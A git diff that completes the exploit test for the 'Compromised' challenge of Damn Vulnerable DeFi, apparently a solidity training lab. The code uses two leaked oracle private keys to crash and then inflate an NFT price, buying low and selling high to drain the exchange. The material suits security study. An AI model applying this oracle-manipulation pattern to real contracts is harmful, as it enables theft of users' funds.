@@ -75,8 +75,40 @@ contract Compromised is Test {
     }
 
     function testExploit() public {
-        /** EXPLOIT START **/
+        //need the help of https://ventral.digital/posts/2022/2/22/damn-vulnerable-defi-v2-7-compromised
 
+        address oracle_1 = vm.addr(
+            0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
+        );
+        address oracle_2 = vm.addr(
+            0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
+        );
+
+        vm.prank(oracle_1);
+        trustfulOracle.postPrice("DVNFT", 0);
+
+        vm.prank(oracle_2);
+        trustfulOracle.postPrice("DVNFT", 0);
+
+        vm.prank(attacker);
+        exchange.buyOne{value: 0.05 ether}();
+
+        vm.prank(oracle_1);
+        trustfulOracle.postPrice("DVNFT", 9990 ether);
+
+        vm.prank(oracle_2);
+        trustfulOracle.postPrice("DVNFT", 9990 ether);
+
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange), 0);
+        exchange.sellOne(0);
+        vm.stopPrank();
+
+        vm.prank(oracle_1);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+        vm.prank(oracle_2);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
         /** EXPLOIT END **/
         validation();
     }
